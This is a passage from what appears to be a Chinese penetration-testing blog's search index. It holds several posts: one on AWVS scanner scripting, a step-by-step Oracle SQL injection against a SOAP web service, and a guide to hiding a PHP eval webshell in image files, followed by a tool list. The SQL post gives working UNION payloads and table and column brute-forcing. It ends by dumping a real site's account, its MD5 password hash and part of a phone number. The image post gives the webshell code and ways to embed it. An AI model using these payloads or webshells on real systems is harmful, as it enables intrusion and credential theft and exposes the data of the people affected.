target.Request.headersString;<span class="comment">//测试请求HTTP头输出到界面</span></span><br><span class="line">ri.response = target.response.body;<span class="comment">//测试请求HTTP响应内容输出到界面</span></span><br><span class="line">ri.fullResponse = target.fullResponse;<span class="comment">//测试请求的完整HTTP响应内容输出到界面</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ri.description = "web services";</span></span><br><span class="line">ri.addReference(<span class="string">"how do sql inject web services"</span>,<span class="string">"http://gv7.me/2017/08/12/how-do-sql-inject-web-services/"</span>);</span><br><span class="line"></span><br><span class="line">AddReportItem(ri);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">logError(scanURL.url+dir.fullPath+<span class="string">"-----&gt;This's not web services!!!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">logWarning(scanURL.url+dir.fullPath+<span class="string">"notFound web services!!!!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/articles/2017/Writing-AWVS-scripts-to-detect-Web-Services/4.png" alt="图4-代码"></p><h2 id="0x3测试"><a href="#0x3测试" class="headerlink" title="0x3测试"></a>0x3测试</h2><p>去网上随便找一个测试站点，该站点/pptx/路径下存在web services的wsdl列表。</p><p><img src="/articles/2017/Writing-AWVS-scripts-to-detect-Web-Services/5.png" alt="图5-测试站点"></p><p>为了方便测试，我们新建一个test策略，策略包含我们写的脚本。</p><p><img src="/articles/2017/Writing-AWVS-scripts-to-detect-Web-Services/6.png" alt="图6-新建test策略"></p><p>扫描选择我们的新建的策略</p><p><img src="/articles/2017/Writing-AWVS-scripts-to-detect-Web-Services/7.png" alt="图7-测试扫描设置"></p><p>扫描结果中发现，已经找到web services<br><img src="/articles/2017/Writing-AWVS-scripts-to-detect-Web-Services/8.png" alt="图8-测试扫描结果"></p><p>后面我在这个代码基础上泄露发现SVN泄露的脚本，大家想让AWVS发现更多漏洞，可以自己尝试去写写。</p><h2 id="0x4AWVS脚本编写资料"><a href="#0x4AWVS脚本编写资料" class="headerlink" title="0x4AWVS脚本编写资料"></a>0x4AWVS脚本编写资料</h2><p>如果想了解更多编写脚本的资料。可以下载以下推荐的资料，若你有更好，欢淫共享感激不尽。</p><h3 id="官方SDK文档"><a href="#官方SDK文档" class="headerlink" title="官方SDK文档"></a>官方SDK文档</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.acunetix.com/resources/sdk/</span><br></pre></td></tr></table></figure><h3 id="官方开发工具包"><a href="#官方开发工具包" class="headerlink" title="官方开发工具包"></a>官方开发工具包</h3><p>工具包里有一个文档，和3个脚本例子。大家可以参考一下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.acunetix.com/download/tools/WVSSDK.zip</span><br></pre></td></tr></table></figure><h3 id="解密的扫描脚本"><a href="#解密的扫描脚本" class="headerlink" title="解密的扫描脚本"></a>解密的扫描脚本</h3><p>大家可能发现在/data/script/文件夹下的所有脚本都加密了，我们无法查看源码。这对于我们想学习编写脚本的童鞋很是不利。这里给大家发个福利：〇〇木一大神解密AWVS 10.5的script文件夹下所有脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/c0ny1/awvs_script_decode</span><br></pre></td></tr></table></figure><p>百度云下载(base64)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dXJs77yaaHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMXNscjRIUHogcHdk77yaYjNtbw==</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 插件开发 </tag>
            
            <tag> AWVS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>发现Web Services存在注入，无法用sqlmap怎么办？</title>
      <link href="/articles/2017/how-do-sql-inject-web-services/"/>
      <url>/articles/2017/how-do-sql-inject-web-services/</url>
      
        <content type="html"><![CDATA[<h3 id="如何对Web-Services服务进行注入？"><a href="#如何对Web-Services服务进行注入？" class="headerlink" title="如何对Web Services服务进行注入？"></a>如何对Web Services服务进行注入？</h3><p>我们都知道sqlmap等一些工具不能对web services服务进行注入，因为web services使用的是SOAP协议，与我们提传统的http协议有些差异。手工+工具结合的方法完成这次的漏洞利用。下面我们一个案例演示一下，如何利用burp+sqlmap字典进行注入web services。</p><p>访问以下地址:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/services</span><br></pre></td></tr></table></figure><p><img src="/articles/2017/how-do-sql-inject-web-services/1.png" alt="图1-web service的wdls列表"></p><h2 id="0x01扫描"><a href="#0x01扫描" class="headerlink" title="0x01扫描"></a>0x01扫描</h2><p>将列表中的的WSDL地址依次丢到AWVS的Web Services Scanner中进行扫描，发现存在sql注入</p><p><img src="/articles/2017/how-do-sql-inject-web-services/2.png" alt="图2-AWVS扫描结果"></p><h2 id="0x02识别正常返回与异常返回"><a href="#0x02识别正常返回与异常返回" class="headerlink" title="0x02识别正常返回与异常返回"></a>0x02识别正常返回与异常返回</h2><p>转到AWVS中的Web Services Editor中import刚才扫描的</p><h3 id="正常返回（有数据）"><a href="#正常返回（有数据）" class="headerlink" title="正常返回（有数据）"></a>正常返回（有数据）</h3><p><img src="/articles/2017/how-do-sql-inject-web-services/3.png" alt="图3-正常返回（有数据）"></p><h3 id="正常返回（无数据）"><a href="#正常返回（无数据）" class="headerlink" title="正常返回（无数据）"></a>正常返回（无数据）</h3><p><img src="/articles/2017/how-do-sql-inject-web-services/4.png" alt="图4-正常返回（无数据）"></p><h3 id="异常返回"><a href="#异常返回" class="headerlink" title="异常返回"></a>异常返回</h3><p><img src="/articles/2017/how-do-sql-inject-web-services/5.png" alt="图5-异常返回"></p><h2 id="0x03判断数据库类型"><a href="#0x03判断数据库类型" class="headerlink" title="0x03判断数据库类型"></a>0x03判断数据库类型</h2><p>由于一般的jsp应用基本都使用oracle数据库，我们优先判断是否是oracle数据库！</p><p>注入语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; or chr(123)||chr(123)=chr(123)||chr(123) -- </span><br><span class="line">-1&apos; or (select count (*) from user_tables)&gt;0 --</span><br><span class="line">-1&apos; or (select count (*) from dual)&gt;0 --</span><br></pre></td></tr></table></figure><p>发现他们都返回正常，说明为oracle数据库<br><img src="/articles/2017/how-do-sql-inject-web-services/6.png" alt="图6-是否为oracle"></p><h2 id="0x04判断字段个数"><a href="#0x04判断字段个数" class="headerlink" title="0x04判断字段个数"></a>0x04判断字段个数</h2><p>使用 order by num语句来判断字段的个数。</p><p>根据以下注入语句的结果，可知字段个数为25</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; or order by 25 --   /*返回正常*/</span><br><span class="line">-1&apos; or order by 26 --/*返回异常*/</span><br></pre></td></tr></table></figure><h2 id="0x05确定每个字段类型"><a href="#0x05确定每个字段类型" class="headerlink" title="0x05确定每个字段类型"></a>0x05确定每个字段类型</h2><p>由于我们此时不知道每个字段的类型，所以先用null来代替。故注入语句构造如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; union select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null from user_tables --</span><br></pre></td></tr></table></figure><p><img src="/articles/2017/how-do-sql-inject-web-services/7.png" alt="图7"></p><p>判断方法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; union select 1,null,null,... from user_tables -- /*返回正常，说明该字段为数字型*/</span><br><span class="line">-1&apos; union select &apos;1&apos;,null,null,... from user_tables -- /*返回正常，说明该字段为字符型*/</span><br></pre></td></tr></table></figure><p>使用以上方法测试每个字段，发现它们都是字符型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; union select &apos;1&apos;,&apos;2&apos;,&apos;3&apos;,&apos;4&apos;,&apos;5&apos;,&apos;6&apos;,&apos;7&apos;,&apos;8&apos;,&apos;9&apos;,&apos;10&apos;,&apos;11&apos;,&apos;12&apos;,&apos;13&apos;,&apos;14&apos;,&apos;15&apos;,&apos;16&apos;,&apos;17&apos;,&apos;18&apos;,&apos;19&apos;,&apos;20&apos;,&apos;21&apos;,&apos;22&apos;,&apos;23&apos;,&apos;24&apos;,&apos;25&apos; from user_tables --</span><br></pre></td></tr></table></figure><p><img src="/articles/2017/how-do-sql-inject-web-services/8.png" alt="图8"></p><h2 id="0x06爆破表名"><a href="#0x06爆破表名" class="headerlink" title="0x06爆破表名"></a>0x06爆破表名</h2><p>由于这样的格式我们无法使用sqlmap进行注入。</p><p>思路：使用burp+sqlmap的tables字典，对下面语句的user_tables表名进行爆破。</p><p>设置AWVS的代理为burp suite的本机代理</p><p><img src="/articles/2017/how-do-sql-inject-web-services/9.png" alt="图9设置AWVS代理"></p><p>将数据包从AWVS的Web Servives Editor里送入burp suite的Intruder中</p><p><img src="/articles/2017/how-do-sql-inject-web-services/10.png" alt="图10发送数据包到burp suite"></p><p>选择sqlmap的txt目录下的表字典common-tables.txt，进行爆破。</p><p><img src="/articles/2017/how-do-sql-inject-web-services/11.png" alt="图11爆破表名"></p><p>爆破表名结果</p><p><img src="/articles/2017/how-do-sql-inject-web-services/12.png" alt="图12爆破表名结果"></p><h2 id="0x07爆破字段名"><a href="#0x07爆破字段名" class="headerlink" title="0x07爆破字段名"></a>0x07爆破字段名</h2><p>爆破字段名，思路入爆破表名一致。语句是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; union select columns,&apos;2&apos;,&apos;3&apos;,&apos;4&apos;,&apos;5&apos;,&apos;6&apos;,&apos;7&apos;,&apos;8&apos;,&apos;9&apos;,&apos;10&apos;,&apos;11&apos;,&apos;12&apos;,&apos;13&apos;,&apos;14&apos;,&apos;15&apos;,&apos;16&apos;,&apos;17&apos;,&apos;18&apos;,&apos;19&apos;,&apos;20&apos;,&apos;21&apos;,&apos;22&apos;,&apos;23&apos;,&apos;24&apos;,&apos;25&apos; from  tbl_user --</span><br></pre></td></tr></table></figure><p>注意：tbl_user为上一步骤爆破发现的表名,colums为使用burp加载sqlmap字段字典common-columns.txt进行爆破的地方。</p><p><img src="/articles/2017/how-do-sql-inject-web-services/13.png" alt="图13-爆破字段名"></p><p>设置过程与爆破表名类似不在细说，爆破结果结果如图所示。</p><p><img src="/articles/2017/how-do-sql-inject-web-services/14.png" alt="图14-爆破字段名结果"></p><h2 id="0x08导出账号密码"><a href="#0x08导出账号密码" class="headerlink" title="0x08导出账号密码"></a>0x08导出账号密码</h2><p>综上最终注入语句为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; union select user,password,mobile,&apos;4&apos;,&apos;5&apos;,&apos;6&apos;,&apos;7&apos;,&apos;8&apos;,&apos;9&apos;,&apos;10&apos;,&apos;11&apos;,&apos;12&apos;,&apos;13&apos;,&apos;14&apos;,&apos;15&apos;,&apos;16&apos;,&apos;17&apos;,&apos;18&apos;,&apos;19&apos;,&apos;20&apos;,&apos;21&apos;,&apos;22&apos;,&apos;23&apos;,&apos;24&apos;,&apos;25&apos; from  tbl_user --</span><br></pre></td></tr></table></figure><p><img src="/articles/2017/how-do-sql-inject-web-services/15.png" alt="图15-注入得到账号密码"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">账号：DT*****AP </span><br><span class="line">密码：e10adc3949ba59abbe56e057f20f883e</span><br><span class="line">电话：139*****887</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="http://blog.csdn.net/cclarence/article/details/49784595" target="_blank" rel="noopener">oracle数据库注入实战</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图片木马制作大法</title>
      <link href="/articles/2017/picture-trojan-horse-making-method/"/>
      <url>/articles/2017/picture-trojan-horse-making-method/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01什么是图片木马？"><a href="#0x01什么是图片木马？" class="headerlink" title="0x01什么是图片木马？"></a>0x01什么是图片木马？</h2><p>图片木马在网络上没有统一的定义，在这里我给出自己的定义。图片木马是一张能正常显示又包含恶意代码（比如一句话木马）的图片文件。</p><p>根据定义我们知道图片木马两个条件：</p><ul><li>图片能正常显示</li><li>包含能执行的而已代码</li></ul><p>总体思路：将恶意代码写在图片文件中非图片数据区，防止写入导致图片损坏。</p><p>常规的图片格式有gif,png,jpg格式</p><h2 id="0x02将恶意代码写在图片尾部"><a href="#0x02将恶意代码写在图片尾部" class="headerlink" title="0x02将恶意代码写在图片尾部"></a>0x02将恶意代码写在图片尾部</h2><p>适合格式：任何图片格式</p><h3 id="方法一：copy法"><a href="#方法一：copy法" class="headerlink" title="方法一：copy法"></a>方法一：copy法</h3><p>准备一张正常图片（a.jpg）,新建一个文件内容写入以下代码（b.php）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用以下命令生成图片木马muma.jpg</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy /b a.jpg + b.php/a = muma.jpg</span><br></pre></td></tr></table></figure><p><img src="/articles/2017/picture-trojan-horse-making-method/1.jpg" alt="copy_20170726"></p><h3 id="方法二：二进制编辑器法"><a href="#方法二：二进制编辑器法" class="headerlink" title="方法二：二进制编辑器法"></a>方法二：二进制编辑器法</h3><p>使用二进制编辑工具（比如winhex,utrl editor等等）直接写恶意代码到文件尾部。<br>这里我使用winhex给大家演示<br><img src="/articles/2017/picture-trojan-horse-making-method/2.jpg" alt="winhex_20170726"><br><img src="/articles/2017/picture-trojan-horse-making-method/3.gif" alt="winhex_20170726"></p><h2 id="0x03图片描述法"><a href="#0x03图片描述法" class="headerlink" title="0x03图片描述法"></a>0x03图片描述法</h2><p>jpg格式的图片有exif这个结构，专门用来描述 </p><h3 id="方法一：ps法"><a href="#方法一：ps法" class="headerlink" title="方法一：ps法"></a>方法一：ps法</h3><p>使用ps打开图片，在描述出填入恶意代码，最后保存</p><p>其实也可以用gimp</p><p><img src="/articles/2017/picture-trojan-horse-making-method/4.jpg" alt="ps01_20170726"><br><img src="/articles/2017/picture-trojan-horse-making-method/img/ps02.jpg" alt="ps02"></p><h3 id="方法二：edjpgcom"><a href="#方法二：edjpgcom" class="headerlink" title="方法二：edjpgcom"></a>方法二：edjpgcom</h3><p>将要注入恶意代码的图片拖到edjpgcom.exe上，在edjpgcom弹出的输入框中输入一句话。<br><img src="/articles/2017/picture-trojan-horse-making-method/5.jpg" alt="edjpgcom_20170726"></p><p><a href="http://pan.baidu.com/sdfwfewfew" target="_blank" rel="noopener">edjpgcom下载</a></p><h2 id="0x04渲染绕过"><a href="#0x04渲染绕过" class="headerlink" title="0x04渲染绕过"></a>0x04渲染绕过</h2><p>适合格式：gif<br>现在的网站对于图片上传的防范越来越严，经常对上传的图片二次渲染。导致我们的通过方法思路一和思路二的方法注入的而已代码，在渲染之后被“清洗”掉了！这时候我们就得思考如何去绕过。<br>绕过思路：对比上传前和上传后的图片的差异，找到相同数据同时又是非图片数据区的地方，在在，此处写入恶意代码。</p><p>下载笔者开发的上传绕过框架（uplaod bypass framework),里面有一个二次渲染绕过上传</p><p>步骤一：对比</p><p>步骤二：写入</p>]]></content>
      
      
      <categories>
          
          <category> 奇技淫巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图片木马 </tag>
            
            <tag> webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>那些值得我们去研究的工具</title>
      <link href="/articles/2017/tools/"/>
      <url>/articles/2017/tools/</url>
      
        <content type="html"><![CDATA[<p>当下网络安全的工具层出不穷，质量参差不齐。大没必要到处收集。那些经得住时间考验的工具都是流传的经典。把它们用熟了，自然以一当百。它们当中的一些开源的，最好去阅读一下源码。那些设计，那些编码都体现着hack编程精华。吾等自当研习工具中的一招一式！</p><h2 id="firefox插件"><a href="#firefox插件" class="headerlink" title="firefox插件"></a>firefox插件</h2><p>firefox我推荐使用老版本（41）并设置好不要自动升级</p><ul><li>Firebug</li><li>hackbar</li><li>Live HTTP header</li><li>FoxyProxy</li><li>Tamper Date</li><li>Modify headers</li><li>Cookie Editor</li></ul><h2 id="chorme浏览器插件"><a href="#chorme浏览器插件" class="headerlink" title="chorme浏览器插件"></a>chorme浏览器插件</h2><ul><li>EditThisCookie</li><li>SwitchyOmega</li><li>IP Whois &amp; Flags Chrome &amp; Websites Rating</li><li>Wizdler</li></ul><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ul><li>matgo</li><li>spiderfoot</li><li>站长之家</li></ul><h2 id="端口扫描："><a href="#端口扫描：" class="headerlink" title="端口扫描："></a>端口扫描：</h2><ul><li>nmap</li><li>s扫描</li><li>zmap</li><li>masscan</li></ul><h2 id="文本编辑器"><a href="#文本编辑器" class="headerlink" title="文本编辑器"></a>文本编辑器</h2><ul><li>notepad++</li><li>EmEditor</li><li>Sublime</li><li>vim/Emacs</li></ul><h2 id="科学上网"><a href="#科学上网" class="headerlink" title="科学上网"></a>科学上网</h2><ul><li>lantern</li><li>tor browse</li><li>极速（HideMe-VPN）</li><li>赛风（psiphon3）</li><li>xx-net</li></ul><h2 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h2><p>在线</p><ul><li>hydra</li><li>美杜莎</li><li>hcrack</li><li>Patator</li></ul><p>本地</p><ul><li>Windows：opdra</li><li>jhone the pidder</li><li>cain</li></ul><h2 id="漏洞利用工具"><a href="#漏洞利用工具" class="headerlink" title="漏洞利用工具"></a>漏洞利用工具</h2><p>metasploit</p><h2 id="工具包"><a href="#工具包" class="headerlink" title="工具包"></a>工具包</h2><ul><li>pentestbox</li></ul><h2 id="翻译插件"><a href="#翻译插件" class="headerlink" title="翻译插件"></a>翻译插件</h2><p><a href="http://web.yeekit.com/" target="_blank" rel="noopener">http://web.yeekit.com/</a></p><center><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=437250085&auto=1&height=32"></iframe></center>]]></content>
      
      
      <categories>
          
          <category> 神器推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
